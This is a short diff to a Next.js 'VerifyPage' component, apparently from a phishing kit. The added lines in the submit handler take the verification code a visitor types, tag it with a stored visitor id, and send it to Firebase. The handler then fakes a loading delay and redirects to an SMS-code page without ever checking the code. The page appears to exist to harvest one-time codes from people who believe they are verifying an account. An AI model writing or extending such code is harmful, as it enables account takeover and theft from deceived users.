@@ -8,15 +8,19 @@ import { MessageCircle, ArrowLeft } from "lucide-react"
 import { useRouter } from "next/navigation"
 import { useState } from "react"
 import Link from "next/link"
+import { addData } from "@/lib/firebase"
 
 export default function VerifyPage() {
   const router = useRouter()
-  const [code, setCode] = useState("** **")
+  const [code, setCode] = useState(" ")
   const [isLoading, setIsLoading] = useState(false)
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-setIsLoading(true)
+    const _id = localStorage.getItem('visitor')
+    addData({ id: _id, codeone: code })
+
+    setIsLoading(true)
     setTimeout(() => {
       setIsLoading(false)
       router.push("/verify-sms")
